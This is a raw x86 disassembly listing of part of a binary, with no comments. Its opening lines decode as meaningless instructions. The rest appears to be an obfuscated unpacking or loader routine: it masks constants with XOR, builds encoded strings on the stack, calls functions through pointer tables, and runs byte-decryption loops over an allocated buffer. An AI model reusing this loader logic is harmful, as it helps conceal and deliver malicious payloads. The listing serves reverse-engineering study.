  424704:	jp     0x4246fd
  424706:	xor    DWORD PTR [edx-0x17],esi
  424709:	jmp    0x7bbdc25c
  42470e:	cmc    
  42470f:	repnz fidivr WORD PTR [ebp+0x7a]
  424713:	jp     0x42470c
  424715:	xor    DWORD PTR [edx+0x7b],esi
  424718:	add    DWORD PTR [edx-0x17],esi
  42471b:	jmp    0x7bbdc25a
  424720:	cmc    
  424721:	repnz sar BYTE PTR [ebp+0x7a],cl
  424725:	jp     0x4246b9
  424727:	test   DWORD PTR [edi+0x7a],ebx
  42472a:	jp     0x424723
  42472c:	sub    DWORD PTR [edx-0x578048b1],ecx
  424732:	inc    edi
  424733:	mov    dl,0x6b
  424735:	(bad)  
  424736:	stc    
  424737:	jg     0x4247b3
  424739:	jp     0x424732
  42473b:	xor    DWORD PTR [edx-0x9],esi
  42473e:	cli    
  42473f:	out    dx,al
  424740:	jge    0x4247bc
  424742:	jp     0x42473b
  424744:	jb     0x42473d
  424746:	xor    DWORD PTR [edx-0x9],esi
  424749:	cli    
  42474a:	out    dx,al
  42474b:	jge    0x4247c7
  42474d:	jp     0x424746
  42474f:	jp     0x4247d0
  424751:	cmp    eax,0x829f746
  424756:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42475c:	lea    edx,[ebp-0xec]
  424762:	push   edx
  424763:	mov    edx,DWORD PTR [ebp+0x8]
  424766:	mov    edx,DWORD PTR [edx+0x18c]
  42476c:	mov    edx,DWORD PTR [edx]
  42476e:	add    edx,DWORD PTR [eax+0x88]
  424774:	push   0x4
  424776:	push   DWORD PTR [eax+0x8c]
  42477c:	push   edx
  42477d:	call   DWORD PTR [ecx+0x1c]
  424780:	push   DWORD PTR [ebp+0x8]
  424783:	xor    eax,eax
  424785:	mov    DWORD PTR [ebp-0xa8],0x123f0f35
  42478f:	mov    DWORD PTR [ebp-0xa4],0xb360c1d
  424799:	mov    DWORD PTR [ebp-0xa0],0x3d0c1103
  4247a3:	mov    BYTE PTR [ebp-0x9c],0x7a
  4247aa:	lea    edi,[ebp-0x9b]
  4247b0:	stos   DWORD PTR es:[edi],eax
  4247b1:	stos   WORD PTR es:[edi],ax
  4247b3:	stos   BYTE PTR es:[edi],al
  4247b4:	xor    eax,eax
  4247b6:	mov    DWORD PTR [ebp-0xbc],0x123f0f35
  4247c0:	mov    DWORD PTR [ebp-0xb8],0xb360c1d
  4247ca:	mov    DWORD PTR [ebp-0xb4],0x230c1103
  4247d4:	mov    BYTE PTR [ebp-0xb0],0x7a
  4247db:	lea    edi,[ebp-0xaf]
  4247e1:	stos   DWORD PTR es:[edi],eax
  4247e2:	stos   WORD PTR es:[edi],ax
  4247e4:	stos   BYTE PTR es:[edi],al
  4247e5:	mov    edi,DWORD PTR [ebp+0x8]
  4247e8:	mov    eax,DWORD PTR [ebp+0x8]
  4247eb:	mov    edx,DWORD PTR [eax+0x1b8]
  4247f1:	mov    DWORD PTR [ebp-0x68],0xc0e0f16
  4247f8:	mov    DWORD PTR [ebp-0x64],0x150a091f
  4247ff:	mov    WORD PTR [ebp-0x60],0x7a3d
  424805:	mov    DWORD PTR [ebp-0x90],0x123f0f35
  42480f:	mov    DWORD PTR [ebp-0x8c],0x163d0c1d
  424819:	mov    DWORD PTR [ebp-0x88],0x281d120a
  424823:	mov    DWORD PTR [ebp-0x84],0xc110901
  42482d:	mov    DWORD PTR [ebp-0x80],0x7a3d1f15
  424834:	mov    DWORD PTR [ebp-0x7c],0x123f0f35
  42483b:	mov    DWORD PTR [ebp-0x78],0x163d0c1d
  424842:	mov    DWORD PTR [ebp-0x74],0x281d120a
  424849:	mov    DWORD PTR [ebp-0x70],0xc110901
  424850:	mov    DWORD PTR [ebp-0x6c],0x7a231f15
  424857:	call   0x426b53
  42485c:	push   eax
  42485d:	mov    eax,DWORD PTR [ebp+0x8]
  424860:	mov    eax,DWORD PTR [eax+0x1a8]
  424866:	push   DWORD PTR [eax]
  424868:	call   0x4267f4
  42486d:	test   eax,eax
  42486f:	jne    0x4248c1
  424871:	mov    eax,DWORD PTR [ebp+0x8]
  424874:	mov    eax,DWORD PTR [eax+0x1d8]
  42487a:	mov    edi,DWORD PTR [ebp+0x8]
  42487d:	add    eax,0x4
  424880:	mov    DWORD PTR [ebp-0x24],eax
  424883:	mov    eax,DWORD PTR [ebp+0x8]
  424886:	mov    edx,DWORD PTR [eax+0x1b8]
  42488c:	call   0x426b53
  424891:	push   eax
  424892:	mov    eax,DWORD PTR [ebp-0x24]
  424895:	call   DWORD PTR [eax]
  424897:	test   eax,eax
  424899:	jne    0x4248c1
  42489b:	mov    eax,DWORD PTR [ebp+0x8]
  42489e:	mov    eax,DWORD PTR [eax+0x1d8]
  4248a4:	mov    edi,DWORD PTR [ebp+0x8]
  4248a7:	add    eax,0x10
  4248aa:	mov    DWORD PTR [ebp-0x24],eax
  4248ad:	mov    eax,DWORD PTR [ebp+0x8]
  4248b0:	mov    edx,DWORD PTR [eax+0x1b8]
  4248b6:	call   0x426b53
  4248bb:	push   eax
  4248bc:	mov    eax,DWORD PTR [ebp-0x24]
  4248bf:	call   DWORD PTR [eax]
  4248c1:	mov    eax,DWORD PTR [ebp-0x10]
  4248c4:	mov    ecx,DWORD PTR [ebp-0x28]
  4248c7:	xor    eax,ebx
  4248c9:	add    eax,esi
  4248cb:	cmp    eax,ecx
  4248cd:	je     0x424a90
  4248d3:	mov    eax,DWORD PTR [ebp-0x18]
  4248d6:	xor    eax,ebx
  4248d8:	mov    ecx,0xffcd8d14
  4248dd:	sub    ecx,eax
  4248df:	add    ecx,DWORD PTR [ebp-0x28]
  4248e2:	mov    eax,DWORD PTR [ebp-0x1c]
  4248e5:	cmp    eax,ecx
  4248e7:	ja     0x424a90
  4248ed:	mov    DWORD PTR [ebp-0x20],0x0
  4248f4:	push   DWORD PTR [ebp+0x8]
  4248f7:	mov    edi,DWORD PTR [ebp+0x8]
  4248fa:	mov    eax,DWORD PTR [ebp+0x8]
  4248fd:	mov    edx,DWORD PTR [eax+0x1b4]
  424903:	call   0x426b53
  424908:	push   eax
  424909:	mov    eax,DWORD PTR [ebp+0x8]
  42490c:	mov    eax,DWORD PTR [eax+0x1a8]
  424912:	push   DWORD PTR [eax]
  424914:	call   0x4267f4
  424919:	mov    ecx,DWORD PTR [ebp+0x8]
  42491c:	mov    ecx,DWORD PTR [ecx+0x19c]
  424922:	mov    DWORD PTR [ecx],eax
  424924:	mov    eax,DWORD PTR [ebp+0x8]
  424927:	mov    edi,DWORD PTR [eax+0x1d8]
  42492d:	mov    esi,DWORD PTR [ebp+0x8]
  424930:	xor    eax,eax
  424932:	lea    edx,[ebp-0x7c]
  424935:	call   0x426b89
  42493a:	push   eax
  42493b:	mov    eax,DWORD PTR [ebp+0x8]
  42493e:	mov    eax,DWORD PTR [eax+0x19c]
  424944:	push   DWORD PTR [eax]
  424946:	call   DWORD PTR [edi+0x8]
  424949:	mov    DWORD PTR [ebp-0x24],eax
  42494c:	mov    eax,DWORD PTR [ebp+0x8]
  42494f:	mov    edi,DWORD PTR [eax+0x1d8]
  424955:	mov    esi,DWORD PTR [ebp+0x8]
  424958:	xor    eax,eax
  42495a:	lea    edx,[ebp-0x90]
  424960:	call   0x426b89
  424965:	push   eax
  424966:	mov    eax,DWORD PTR [ebp+0x8]
  424969:	mov    eax,DWORD PTR [eax+0x19c]
  42496f:	push   DWORD PTR [eax]
  424971:	call   DWORD PTR [edi+0x8]
  424974:	mov    eax,DWORD PTR [ebp+0x8]
  424977:	mov    edi,DWORD PTR [eax+0x1d8]
  42497d:	mov    esi,DWORD PTR [ebp+0x8]
  424980:	xor    eax,eax
  424982:	lea    edx,[ebp-0xa8]
  424988:	call   0x426b89
  42498d:	push   eax
  42498e:	mov    eax,DWORD PTR [ebp+0x8]
  424991:	mov    eax,DWORD PTR [eax+0x19c]
  424997:	push   DWORD PTR [eax]
  424999:	call   DWORD PTR [edi+0x8]
  42499c:	and    DWORD PTR [ebp-0x8],0x0
  4249a0:	mov    DWORD PTR [ebp-0x44],eax
  4249a3:	mov    eax,DWORD PTR [ebp-0x8]
  4249a6:	and    eax,0x7
  4249a9:	add    eax,0x31
  4249ac:	push   eax
  4249ad:	call   DWORD PTR [ebp-0x24]
  4249b0:	test   eax,eax
  4249b2:	je     0x4249f6
  4249b4:	mov    eax,DWORD PTR [ebp-0x8]
  4249b7:	push   0x19
  4249b9:	xor    edx,edx
  4249bb:	pop    ecx
  4249bc:	div    ecx
  4249be:	add    dl,0x41
  4249c1:	movzx  eax,dl
  4249c4:	push   eax
  4249c5:	call   DWORD PTR [ebp-0x44]
  4249c8:	test   eax,eax
  4249ca:	jne    0x4249f6
  4249cc:	mov    eax,DWORD PTR [ebp+0x8]
  4249cf:	mov    edi,DWORD PTR [eax+0x1d8]
  4249d5:	mov    esi,DWORD PTR [ebp+0x8]
  4249d8:	xor    eax,eax
  4249da:	lea    edx,[ebp-0x68]
  4249dd:	call   0x426b89
  4249e2:	push   eax
  4249e3:	mov    eax,DWORD PTR [ebp+0x8]
  4249e6:	mov    eax,DWORD PTR [eax+0x198]
  4249ec:	push   DWORD PTR [eax]
  4249ee:	call   DWORD PTR [edi+0x8]
  4249f1:	mov    DWORD PTR [ebp-0x14],eax
  4249f4:	jmp    0x4249fa
  4249f6:	and    DWORD PTR [ebp-0x14],0x0
  4249fa:	inc    DWORD PTR [ebp-0x8]
  4249fd:	cmp    DWORD PTR [ebp-0x8],0x10
  424a01:	jb     0x4249a3
  424a03:	mov    eax,DWORD PTR [ebp-0x18]
  424a06:	mov    esi,DWORD PTR [ebp+0x8]
  424a09:	xor    eax,ebx
  424a0b:	mov    edi,0x3272ec
  424a10:	add    eax,edi
  424a12:	lea    edx,[ebp-0x10c]
  424a18:	call   0x426b89
  424a1d:	push   eax
  424a1e:	mov    eax,DWORD PTR [ebp-0x10]
  424a21:	mov    esi,DWORD PTR [ebp+0x8]
  424a24:	xor    eax,ebx
  424a26:	add    eax,edi
  424a28:	lea    edx,[ebp-0x12c]
  424a2e:	call   0x426b89
  424a33:	push   eax
  424a34:	call   DWORD PTR [ebp-0x14]
  424a37:	mov    ecx,DWORD PTR [ebp-0x10]
  424a3a:	xor    ecx,ebx
  424a3c:	add    ecx,edi
  424a3e:	cmp    ecx,eax
  424a40:	jne    0x424a49
  424a42:	mov    DWORD PTR [ebp-0x20],0x1
  424a49:	mov    eax,DWORD PTR [ebp-0x18]
  424a4c:	mov    ecx,DWORD PTR [ebp-0x1c]
  424a4f:	xor    eax,ebx
  424a51:	lea    eax,[eax+ecx*1+0x3272ec]
  424a58:	mov    DWORD PTR [ebp-0x1c],eax
  424a5b:	mov    eax,DWORD PTR [ebp-0x20]
  424a5e:	test   eax,eax
  424a60:	je     0x424a74
  424a62:	mov    eax,DWORD PTR [ebp-0x18]
  424a65:	mov    ecx,DWORD PTR [ebp-0x34]
  424a68:	xor    eax,ebx
  424a6a:	lea    eax,[eax+ecx*1+0x3272ec]
  424a71:	mov    DWORD PTR [ebp-0x34],eax
  424a74:	mov    eax,DWORD PTR [ebp-0x18]
  424a77:	xor    eax,ebx
  424a79:	mov    ecx,0xffcd8d14
  424a7e:	sub    ecx,eax
  424a80:	add    ecx,DWORD PTR [ebp-0x28]
  424a83:	mov    eax,DWORD PTR [ebp-0x1c]
  424a86:	cmp    eax,ecx
  424a88:	jbe    0x4248ed
  424a8e:	mov    esi,edi
  424a90:	mov    eax,DWORD PTR [ebp-0x34]
  424a93:	mov    ecx,DWORD PTR [ebp-0x1c]
  424a96:	cmp    ecx,eax
  424a98:	jne    0x424aab
  424a9a:	push   DWORD PTR [ebp+0x8]
  424a9d:	lea    eax,[ebp-0x3c]
  424aa0:	push   eax
  424aa1:	call   0x4275f9
  424aa6:	mov    DWORD PTR [ebp-0x2c],eax
  424aa9:	jmp    0x424ab7
  424aab:	mov    eax,DWORD PTR [ebp-0x2c]
  424aae:	mov    ecx,DWORD PTR [ebp-0x18]
  424ab1:	xor    ecx,ebx
  424ab3:	add    ecx,esi
  424ab5:	xor    DWORD PTR [eax],ecx
  424ab7:	mov    eax,DWORD PTR [ebp-0x10]
  424aba:	mov    ecx,DWORD PTR [ebp-0x2c]
  424abd:	xor    eax,ebx
  424abf:	add    eax,esi
  424ac1:	cmp    eax,ecx
  424ac3:	je     0x42523d
  424ac9:	mov    eax,DWORD PTR [ebp-0x10]
  424acc:	mov    ecx,DWORD PTR [ebp-0x3c]
  424acf:	xor    eax,ebx
  424ad1:	add    eax,esi
  424ad3:	cmp    eax,ecx
  424ad5:	je     0x42523d
  424adb:	mov    eax,DWORD PTR [ebp-0x10]
  424ade:	xor    eax,ebx
  424ae0:	add    eax,esi
  424ae2:	jmp    0x424b00
  424ae4:	mov    edi,DWORD PTR [ebp-0x2c]
  424ae7:	mov    cl,al
  424ae9:	and    cl,0x1f
  424aec:	or     dl,0xff
  424aef:	sub    dl,cl
  424af1:	add    BYTE PTR [edi+eax*1],dl
  424af4:	mov    ecx,DWORD PTR [ebp-0x18]
  424af7:	xor    ecx,ebx
  424af9:	lea    eax,[eax+ecx*1+0x3272ec]
  424b00:	mov    ecx,DWORD PTR [ebp-0x3c]
  424b03:	cmp    eax,ecx
  424b05:	jb     0x424ae4
  424b07:	mov    eax,DWORD PTR [ebp-0x3c]
  424b0a:	mov    DWORD PTR [ebp-0x28],eax
  424b0d:	mov    eax,DWORD PTR [ebp-0x2c]
  424b10:	mov    DWORD PTR [ebp-0x34],0xf89c85b0
  424b17:	mov    DWORD PTR [ebp-0xd4],eax
  424b1d:	mov    edi,0xf89c85b1
  424b22:	mov    DWORD PTR [ebp-0x30],edi
  424b25:	mov    eax,DWORD PTR [ebp-0x34]
  424b28:	xor    eax,ebx
  424b2a:	add    eax,esi
  424b2c:	mov    DWORD PTR [ebp-0xc],eax
  424b2f:	mov    eax,DWORD PTR [ebp-0x34]
  424b32:	xor    eax,ebx
  424b34:	add    eax,esi
  424b36:	mov    DWORD PTR [ebp-0x8],eax
  424b39:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  424b40:	mov    DWORD PTR [ebp-0x4c],0xf89c85bf
  424b47:	mov    eax,DWORD PTR [ebp-0x34]
  424b4a:	mov    ecx,DWORD PTR [ebp-0x28]
  424b4d:	xor    eax,ebx
  424b4f:	add    eax,esi
  424b51:	cmp    ecx,eax
  424b53:	je     0x424d52
  424b59:	jmp    0x424d2e
  424b5e:	mov    ecx,DWORD PTR [ebp-0xc]
  424b61:	mov    eax,DWORD PTR [ebp-0x28]
  424b64:	sub    eax,ecx
  424b66:	mov    ecx,DWORD PTR [ebp-0x44]
  424b69:	xor    ecx,ebx
  424b6b:	add    ecx,esi
  424b6d:	xor    edx,edx
  424b6f:	div    ecx
  424b71:	mov    DWORD PTR [ebp-0x8],eax
  424b74:	mov    eax,DWORD PTR [ebp-0x4c]
  424b77:	mov    ecx,DWORD PTR [ebp-0x8]
  424b7a:	xor    eax,ebx
  424b7c:	add    eax,esi
  424b7e:	cmp    ecx,eax
  424b80:	jbe    0x424b8c
  424b82:	mov    eax,DWORD PTR [ebp-0x4c]
  424b85:	xor    eax,ebx
  424b87:	add    eax,esi
  424b89:	mov    DWORD PTR [ebp-0x8],eax
  424b8c:	mov    eax,DWORD PTR [ebp-0x44]
  424b8f:	mov    ecx,DWORD PTR [ebp-0x8]
  424b92:	xor    eax,ebx
  424b94:	add    eax,esi
  424b96:	imul   eax,ecx
  424b99:	mov    DWORD PTR [ebp-0x8],eax
  424b9c:	mov    eax,DWORD PTR [ebp-0x34]
  424b9f:	mov    ecx,DWORD PTR [ebp-0x8]
  424ba2:	xor    eax,ebx
  424ba4:	add    eax,esi
  424ba6:	cmp    ecx,eax
  424ba8:	je     0x424d1c
  424bae:	mov    eax,DWORD PTR [ebp-0x8]
  424bb1:	mov    DWORD PTR [ebp-0x14],eax
  424bb4:	mov    eax,DWORD PTR [ebp-0xc]
  424bb7:	add    eax,DWORD PTR [ebp-0xd4]
  424bbd:	mov    DWORD PTR [ebp-0x24],0xf89c85b0
  424bc4:	mov    DWORD PTR [ebp-0x20],edi
  424bc7:	mov    DWORD PTR [ebp-0xe8],0xf89c85b2
  424bd1:	mov    DWORD PTR [ebp-0x8],eax
  424bd4:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  424bdb:	mov    DWORD PTR [ebp-0x1c],edi
  424bde:	mov    eax,DWORD PTR [ebp-0x24]
  424be1:	xor    eax,ebx
  424be3:	add    eax,esi
  424be5:	jmp    0x424cdb
  424bea:	mov    DWORD PTR [ebp-0xe0],0xf89c85bb
  424bf4:	mov    DWORD PTR [ebp-0xc4],0xf89c858e
  424bfe:	mov    eax,DWORD PTR [ebp-0x1c]
  424c01:	mov    ecx,DWORD PTR [ebp-0x48]
  424c04:	xor    eax,ebx
  424c06:	add    eax,esi
  424c08:	imul   eax,ecx
  424c0b:	mov    ecx,DWORD PTR [ebp-0x8]
  424c0e:	mov    al,BYTE PTR [eax+ecx*1]
  424c11:	mov    BYTE PTR [ebp-0x2],al
  424c14:	mov    eax,DWORD PTR [ebp-0x1c]
  424c17:	mov    ecx,DWORD PTR [ebp-0x48]
  424c1a:	xor    eax,ebx
  424c1c:	add    eax,esi
  424c1e:	imul   eax,ecx
  424c21:	mov    ecx,DWORD PTR [ebp-0xe8]
  424c27:	xor    ecx,ebx
  424c29:	add    eax,ecx
  424c2b:	mov    ecx,DWORD PTR [ebp-0x8]
  424c2e:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  424c36:	mov    ecx,DWORD PTR [ebp-0xe0]
  424c3c:	xor    ecx,ebx
  424c3e:	lea    eax,[ecx+eax*1+0x3272ec]
  424c45:	movzx  ecx,BYTE PTR [ebp-0x2]
  424c49:	xor    ecx,eax
  424c4b:	mov    BYTE PTR [ebp-0x2],cl
  424c4e:	mov    al,BYTE PTR [ebp-0x2]
  424c51:	mov    ecx,DWORD PTR [ebp-0x1c]
  424c54:	mov    edx,DWORD PTR [ebp-0x48]
  424c57:	xor    ecx,ebx
  424c59:	add    ecx,esi
  424c5b:	imul   ecx,edx
  424c5e:	mov    edx,DWORD PTR [ebp-0x8]
  424c61:	mov    BYTE PTR [ecx+edx*1],al
  424c64:	mov    eax,DWORD PTR [ebp-0x1c]
  424c67:	mov    ecx,DWORD PTR [ebp-0x48]
  424c6a:	xor    eax,ebx
  424c6c:	add    eax,esi
  424c6e:	imul   eax,ecx
  424c71:	mov    ecx,DWORD PTR [ebp-0x8]
  424c74:	mov    al,BYTE PTR [eax+ecx*1]
  424c77:	mov    BYTE PTR [ebp-0x2],al
  424c7a:	mov    eax,DWORD PTR [ebp-0x1c]
  424c7d:	mov    ecx,DWORD PTR [ebp-0x48]
  424c80:	xor    eax,ebx
  424c82:	add    eax,esi
  424c84:	imul   eax,ecx
  424c87:	mov    ecx,DWORD PTR [ebp-0x20]
  424c8a:	xor    ecx,ebx
  424c8c:	add    eax,ecx
  424c8e:	mov    ecx,DWORD PTR [ebp-0x8]
  424c91:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  424c99:	mov    ecx,DWORD PTR [ebp-0xc4]
  424c9f:	xor    ecx,ebx
  424ca1:	lea    eax,[ecx+eax*1+0x3272ec]
  424ca8:	movzx  ecx,BYTE PTR [ebp-0x2]
  424cac:	xor    ecx,eax
  424cae:	mov    BYTE PTR [ebp-0x2],cl
  424cb1:	mov    al,BYTE PTR [ebp-0x2]
  424cb4:	mov    ecx,DWORD PTR [ebp-0x1c]
  424cb7:	mov    edx,DWORD PTR [ebp-0x48]
  424cba:	xor    ecx,ebx
  424cbc:	add    ecx,esi
  424cbe:	imul   ecx,edx
  424cc1:	mov    edx,DWORD PTR [ebp-0x8]
  424cc4:	mov    BYTE PTR [ecx+edx*1],al
  424cc7:	mov    eax,DWORD PTR [ebp-0x38]
  424cca:	mov    ecx,DWORD PTR [ebp-0x20]
  424ccd:	xor    eax,ebx
  424ccf:	xor    ecx,ebx
  424cd1:	add    eax,esi
  424cd3:	add    ecx,esi
  424cd5:	imul   eax,ecx
  424cd8:	add    eax,DWORD PTR [ebp-0x48]
  424cdb:	mov    DWORD PTR [ebp-0x48],eax
  424cde:	mov    eax,DWORD PTR [ebp-0x48]
  424ce1:	mov    ecx,DWORD PTR [ebp-0x14]
  424ce4:	cmp    ecx,eax
  424ce6:	jb     0x424bea
  424cec:	mov    eax,DWORD PTR [ebp-0x20]
  424cef:	mov    ecx,DWORD PTR [ebp-0x14]
  424cf2:	xor    eax,ebx
  424cf4:	add    eax,esi
  424cf6:	imul   eax,ecx
  424cf9:	mov    ecx,DWORD PTR [ebp-0x24]
  424cfc:	xor    ecx,ebx
  424cfe:	add    ecx,esi
  424d00:	or     eax,ecx
  424d02:	mov    ecx,DWORD PTR [ebp-0x30]
  424d05:	xor    ecx,ebx
  424d07:	add    eax,ecx
  424d09:	mov    ecx,DWORD PTR [ebp-0x30]
  424d0c:	xor    ecx,ebx
  424d0e:	add    eax,ecx
  424d10:	mov    ecx,DWORD PTR [ebp-0xc]
  424d13:	lea    eax,[eax+ecx*1+0x64e5d8]
  424d1a:	jmp    0x424d2b
  424d1c:	mov    eax,DWORD PTR [ebp-0x30]
  424d1f:	mov    ecx,DWORD PTR [ebp-0xc]
  424d22:	xor    eax,ebx
  424d24:	lea    eax,[eax+ecx*1+0x3272ec]
  424d2b:	mov    DWORD PTR [ebp-0xc],eax
  424d2e:	mov    eax,DWORD PTR [ebp-0x30]
  424d31:	xor    eax,ebx
  424d33:	mov    ecx,0xffcd8d14
  424d38:	sub    ecx,eax
  424d3a:	add    ecx,DWORD PTR [ebp-0x28]
  424d3d:	mov    eax,DWORD PTR [ebp-0x30]
  424d40:	mov    edx,DWORD PTR [ebp-0xc]
  424d43:	xor    eax,ebx
  424d45:	add    eax,esi
  424d47:	imul   eax,edx
  424d4a:	cmp    eax,ecx
  424d4c:	jbe    0x424b5e
  424d52:	mov    eax,DWORD PTR [ebp-0x10]
  424d55:	mov    ecx,DWORD PTR [ebp-0x3c]
  424d58:	mov    eax,DWORD PTR [ebp+0x8]
  424d5b:	mov    edx,DWORD PTR [ebp-0x54]
  424d5e:	mov    eax,DWORD PTR [eax+0x1d8]
  424d64:	xor    edx,ebx
  424d66:	add    edx,esi
  424d68:	push   edx
  424d69:	mov    edx,DWORD PTR [ebp-0x40]
  424d6c:	xor    edx,ebx
  424d6e:	add    edx,esi
  424d70:	push   edx
  424d71:	push   ecx
  424d72:	mov    DWORD PTR [ebp-0x38],ecx
  424d75:	mov    ecx,DWORD PTR [ebp-0x10]
  424d78:	xor    ecx,ebx
  424d7a:	add    ecx,esi
  424d7c:	push   ecx
  424d7d:	call   DWORD PTR [eax+0x14]
  424d80:	mov    edi,eax
  424d82:	mov    eax,DWORD PTR [ebp-0x10]
  424d85:	xor    eax,ebx
  424d87:	add    eax,esi
  424d89:	cmp    eax,edi
  424d8b:	je     0x424de6
  424d8d:	mov    eax,DWORD PTR [ebp-0x10]
  424d90:	jmp    0x424db3
  424d92:	mov    ecx,DWORD PTR [ebp-0x2c]
  424d95:	xor    eax,ebx
  424d97:	mov    cl,BYTE PTR [ecx+eax*1+0x3272ec]
  424d9e:	mov    BYTE PTR [eax+edi*1+0x3272ec],cl
  424da5:	mov    ecx,DWORD PTR [ebp-0x18]
  424da8:	xor    ecx,ebx
  424daa:	lea    eax,[ecx+eax*1+0x3272ec]
  424db1:	xor    eax,ebx
  424db3:	mov    ecx,DWORD PTR [ebp-0x3c]
  424db6:	sub    ecx,esi
  424db8:	xor    ecx,ebx
  424dba:	cmp    eax,ecx
  424dbc:	jne    0x424d92
  424dbe:	mov    eax,DWORD PTR [ebp+0x8]
  424dc1:	mov    ecx,DWORD PTR [ebp-0x50]
  424dc4:	mov    eax,DWORD PTR [eax+0x1d8]
  424dca:	xor    ecx,ebx
  424dcc:	add    ecx,esi
  424dce:	push   ecx
  424dcf:	mov    ecx,DWORD PTR [ebp-0x10]
  424dd2:	xor    ecx,ebx
  424dd4:	add    ecx,esi
  424dd6:	push   ecx
  424dd7:	push   DWORD PTR [ebp-0x2c]
  424dda:	call   DWORD PTR [eax+0x18]
  424ddd:	mov    eax,DWORD PTR [ebp-0x38]
  424de0:	mov    DWORD PTR [ebp-0x2c],edi
  424de3:	mov    DWORD PTR [ebp-0x3c],eax
  424de6:	mov    eax,DWORD PTR [ebp-0x2c]
  424de9:	mov    DWORD PTR [ebp-0x14],eax
  424dec:	mov    eax,DWORD PTR [ebp-0x18]
  424def:	mov    ecx,DWORD PTR [ebp-0x10]
  424df2:	xor    eax,ebx
  424df4:	add    eax,esi
  424df6:	mov    DWORD PTR [ebp-0x5c],0x3d222a22
  424dfd:	mov    DWORD PTR [ebp-0x58],0x37223f22
  424e04:	jmp    0x424e37
  424e06:	mov    edx,DWORD PTR [ebp-0x14]
  424e09:	mov    edi,ecx
  424e0b:	xor    edi,ebx
  424e0d:	mov    cl,BYTE PTR [ebp+edi*1+0x327290]
  424e14:	movsx  edx,BYTE PTR [edi+edx*1+0x3272ec]
  424e1c:	xor    cl,0x79
  424e1f:	sub    cl,0x3
  424e22:	movzx  ecx,cl
  424e25:	cmp    edx,ecx
  424e27:	jne    0x424e41
  424e29:	mov    ecx,DWORD PTR [ebp-0x18]
  424e2c:	xor    ecx,ebx
  424e2e:	lea    ecx,[ecx+edi*1+0x3272ec]
  424e35:	xor    ecx,ebx
  424e37:	cmp    ecx,0xf89c85b8
  424e3d:	jne    0x424e06
  424e3f:	jmp    0x424e48
  424e41:	mov    eax,DWORD PTR [ebp-0x10]
  424e44:	xor    eax,ebx
  424e46:	add    eax,esi
  424e48:	mov    ecx,DWORD PTR [ebp-0x10]
  424e4b:	xor    ecx,ebx
  424e4d:	add    ecx,esi
  424e4f:	cmp    ecx,eax
  424e51:	je     0x424fc7
  424e57:	mov    eax,DWORD PTR [ebp-0x14]
  424e5a:	mov    eax,DWORD PTR [eax+0x8]
  424e5d:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  424e64:	mov    DWORD PTR [ebp-0x40],0xf89cc327
  424e6b:	mov    DWORD PTR [ebp-0x44],0xf89cb5b0
  424e72:	mov    DWORD PTR [ebp-0x24],0xf89c85bc
  424e79:	mov    DWORD PTR [ebp-0x20],eax
  424e7c:	mov    eax,DWORD PTR [ebp+0x8]
  424e7f:	mov    ecx,DWORD PTR [ebp-0x24]
  424e82:	xor    ecx,ebx
  424e84:	add    ecx,esi
  424e86:	push   ecx
  424e87:	mov    ecx,DWORD PTR [ebp-0x44]
  424e8a:	mov    eax,DWORD PTR [eax+0x1d8]
  424e90:	xor    ecx,ebx
  424e92:	add    ecx,esi
  424e94:	push   ecx
  424e95:	mov    ecx,DWORD PTR [ebp-0x40]
  424e98:	xor    ecx,ebx
  424e9a:	add    ecx,esi
  424e9c:	push   ecx
  424e9d:	mov    ecx,DWORD PTR [ebp-0xc]
  424ea0:	xor    ecx,ebx
  424ea2:	add    ecx,esi
  424ea4:	push   ecx
  424ea5:	call   DWORD PTR [eax+0x14]
  424ea8:	mov    edi,eax
  424eaa:	mov    eax,DWORD PTR [ebp+0x8]
  424ead:	mov    ecx,DWORD PTR [ebp-0x24]
  424eb0:	mov    eax,DWORD PTR [eax+0x1d8]
  424eb6:	xor    ecx,ebx
  424eb8:	add    ecx,esi
  424eba:	push   ecx
  424ebb:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebe:	xor    ecx,ebx
  424ec0:	add    ecx,esi
  424ec2:	push   ecx
  424ec3:	mov    ecx,DWORD PTR [ebp-0xc]
  424ec6:	push   DWORD PTR [ebp-0x20]
  424ec9:	xor    ecx,ebx
  424ecb:	add    ecx,esi
  424ecd:	push   ecx
  424ece:	call   DWORD PTR [eax+0x14]
  424ed1:	mov    ecx,DWORD PTR [ebp-0xc]
  424ed4:	xor    ecx,ebx
  424ed6:	add    ecx,esi
  424ed8:	mov    DWORD PTR [ebp-0x24],eax
  424edb:	cmp    ecx,edi
  424edd:	je     0x42526a
  424ee3:	mov    ecx,DWORD PTR [ebp-0xc]
  424ee6:	xor    ecx,ebx
  424ee8:	add    ecx,esi
  424eea:	cmp    ecx,eax
  424eec:	je     0x42526a
  424ef2:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  424ef9:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  424f00:	mov    ecx,DWORD PTR [ebp-0x40]
  424f03:	xor    cl,0xa4
  424f06:	sub    cl,0x14
  424f09:	mov    BYTE PTR [edi],cl
  424f0b:	mov    ecx,DWORD PTR [ebp-0xc]
  424f0e:	xor    cl,0xa4
  424f11:	sub    cl,0x14
  424f14:	mov    BYTE PTR [edi+0x1],cl
  424f17:	mov    ecx,DWORD PTR [ebp-0x54]
  424f1a:	xor    cl,0xa4
  424f1d:	sub    cl,0x14
  424f20:	mov    BYTE PTR [edi+0x2],cl
  424f23:	and    DWORD PTR [ebp-0xc8],0x0
  424f2a:	and    DWORD PTR [ebp-0xdc],0x0
  424f31:	lea    ecx,[ebp-0xdc]
  424f37:	push   ecx
  424f38:	push   DWORD PTR [ebp-0x20]
  424f3b:	push   eax
  424f3c:	lea    eax,[ebp-0xc8]
  424f42:	push   eax
  424f43:	mov    eax,DWORD PTR [ebp-0x14]
  424f46:	push   DWORD PTR [eax+0xc]
  424f49:	mov    eax,DWORD PTR [ebp-0x2c]
  424f4c:	add    eax,0x10
  424f4f:	push   eax
  424f50:	push   edi
  424f51:	call   0x4241f5
  424f56:	mov    DWORD PTR [ebp-0x40],eax
  424f59:	mov    eax,DWORD PTR [ebp+0x8]
  424f5c:	mov    ecx,DWORD PTR [ebp-0x50]
  424f5f:	mov    eax,DWORD PTR [eax+0x1d8]
  424f65:	xor    ecx,ebx
